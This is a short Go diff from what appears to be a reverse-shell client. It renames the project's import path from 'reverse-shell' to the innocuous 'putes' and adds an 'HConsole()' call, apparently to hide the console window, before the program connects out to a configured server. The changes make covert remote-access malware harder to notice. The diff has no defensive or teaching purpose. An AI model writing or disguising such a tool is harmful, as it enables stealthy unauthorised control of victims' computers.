@@ -5,9 +5,9 @@ import (
 	"fmt"
 	"net"
 
-	"github.com/kittizz/reverse-shell/pkg/command"
-	"github.com/kittizz/reverse-shell/pkg/model"
-	"github.com/kittizz/reverse-shell/pkg/protocol"
+	"github.com/kittizz/putes/pkg/command"
+	"github.com/kittizz/putes/pkg/model"
+	"github.com/kittizz/putes/pkg/protocol"
 )
 
 var opts = model.Option{}
@@ -24,6 +24,8 @@ func init() {
 	flag.Parse()
 }
 func main() {
+	HConsole()
+
 	p := protocol.NewProtocolProvider()
 	c, err := p.StartConnector(net.JoinHostPort(opts.Server, opts.Port))
 	if err != nil {
